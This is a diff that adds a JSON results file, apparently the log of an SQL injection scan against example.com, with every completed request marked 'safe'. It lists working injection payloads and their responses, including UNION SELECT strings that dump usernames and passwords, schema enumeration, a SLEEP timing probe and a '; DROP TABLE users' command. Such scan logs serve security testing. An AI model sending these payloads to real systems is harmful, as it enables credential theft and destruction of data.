@@ -1,0 +1,93 @@
+{
+    "results": [
+        {
+            "payload": "' OR 1=1 --",
+            "status": "safe",
+            "url": "http://example.com?input=' OR 1=1 --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' OR 'a'='a",
+            "status": "safe",
+            "url": "http://example.com?input=' OR 'a'='a",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' UNION SELECT NULL, username, password FROM users --",
+            "status": "safe",
+            "url": "http://example.com?input=' UNION SELECT NULL, username, password FROM users --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "'; DROP TABLE users --",
+            "status": "error",
+            "error": "('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))"
+        },
+        {
+            "payload": "1' OR '1'='1",
+            "status": "safe",
+            "url": "http://example.com?input=1' OR '1'='1",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "admin'--",
+            "status": "safe",
+            "url": "http://example.com?input=admin'--",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
+            "status": "safe",
+            "url": "http://example.com?input=' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' AND 1=CONVERT(int, '1') --",
+            "status": "safe",
+            "url": "http://example.com?input=' AND 1=CONVERT(int, '1') --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "1' AND SLEEP(5) --",
+            "status": "safe",
+            "url": "http://example.com?input=1' AND SLEEP(5) --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",
+            "status": "safe",
+            "url": "http://example.com?input=' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",
+            "status": "safe",
+            "url": "http://example.com?input=' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' OR 1=1 LIMIT 1,1 --",
+            "status": "safe",
+            "url": "http://example.com?input=' OR 1=1 LIMIT 1,1 --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        },
+        {
+            "payload": "' AND 1=1 UNION SELECT 1,2,3 --",
+            "status": "safe",
+            "url": "http://example.com?input=' AND 1=1 UNION SELECT 1,2,3 --",
+            "status_code": 200,
+            "response_snippet": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <m"
+        }
+    ]
+}
